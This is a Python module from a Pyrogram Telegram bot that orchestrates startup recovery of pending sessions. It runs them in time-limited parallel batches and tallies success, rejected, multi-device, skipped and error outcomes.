"""Refactored from bot.utils.pending_recovery: Recovery orchestrator entry point."""
import asyncio
import time
from typing import Dict

from pyrogram.client import Client

from bot.recovery.constants import (
    DELAY_BETWEEN_BATCHES,
    get_recovery_parallel_limit,
)
from bot.recovery.pending import get_pending_sessions_for_recovery
from bot.recovery.worker import recover_single_session
async def run_pending_recovery(bot_client: Client, max_time_minutes: int = 10) -> Dict[str, int]:
    """
    Main recovery function - runs when bot starts.
    
    Args:
        bot_client: The main bot client
        max_time_minutes: Maximum time to run recovery (default 10 minutes).
            Pass ``None`` to run until every eligible session is processed
            (used by the background startup recovery task so a large backlog
            is never abandoned at a hard time limit).
    
    Returns:
        Stats dict with counts of success, rejected, multi-device, errors
    """
    stats = {
        "total": 0,
        "success": 0,
        "rejected": 0,
        "multi_device": 0,
        "skipped": 0,
        "errors": 0
    }
    
    start_time = time.time()
    max_time_seconds = (max_time_minutes * 60) if max_time_minutes is not None else None
    
    print("=" * 50)
    print("🔄 PENDING SESSION RECOVERY STARTED")
    print("=" * 50)
    
    recovery_list = get_pending_sessions_for_recovery()
    stats["total"] = len(recovery_list)
    
    if not recovery_list:
        print("✅ No pending sessions need recovery")
        print("=" * 50)
        return stats
    
    print(f"📋 Found {len(recovery_list)} sessions to recover")

    # Recovery is SILENT for the user: no "recovery in progress" message is
    # sent. The user only ever receives one of the three genuine verdict
    # messages (SUCCESS / MULTI-DEVICE / REJECTED) once the recovered session
    # resolves - exactly like a normal (non-recovered) session.

    parallel_limit = get_recovery_parallel_limit()
    print(f"📦 Recovery parallel limit: {parallel_limit}")

    for i in range(0, len(recovery_list), parallel_limit):
        if max_time_seconds is not None and time.time() - start_time > max_time_seconds:
            print(f"⏰ RECOVERY: Time limit reached ({max_time_minutes} minutes)")
            break
        
        batch = recovery_list[i:i + parallel_limit]
        batch_num = i // parallel_limit + 1
        total_batches = (len(recovery_list) + parallel_limit - 1) // parallel_limit
        
        print(f"\n📦 Processing batch {batch_num}/{total_batches} ({len(batch)} sessions)")
        
        tasks = []
        for session_id, session_data in batch:
            task = asyncio.create_task(
                recover_single_session(session_id, session_data, bot_client)
            )
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, Exception):
                stats["errors"] += 1
                print(f"❌ RECOVERY: Task exception: {result}")
            elif isinstance(result, tuple):
                success, result_type = result
                if result_type == "SUCCESS":
                    stats["success"] += 1
                elif result_type == "REJECTED":
                    stats["rejected"] += 1
                elif result_type == "MULTI-DEVICE":
                    stats["multi_device"] += 1
                elif result_type in ["ALREADY_SENT", "ALREADY_CLAIMED", "NO_SESSION", "NO_USER", "PENDING"]:
                    stats["skipped"] += 1
                else:
                    stats["errors"] += 1
        
        if i + parallel_limit < len(recovery_list):
            await asyncio.sleep(DELAY_BETWEEN_BATCHES)
    
    elapsed = time.time() - start_time
    
    print("\n" + "=" * 50)
    print("🔄 PENDING SESSION RECOVERY COMPLETED")
    print("=" * 50)
    print(f"⏱️ Time: {elapsed:.1f} seconds")
    print(f"📊 Total: {stats['total']}")
    print(f"✅ Success: {stats['success']}")
    print(f"❌ Rejected: {stats['rejected']}")
    print(f"📱 Multi-Device: {stats['multi_device']}")
    print(f"⏭️ Skipped: {stats['skipped']}")
    print(f"⚠️ Errors: {stats['errors']}")
    print("=" * 50)
    
    return stats
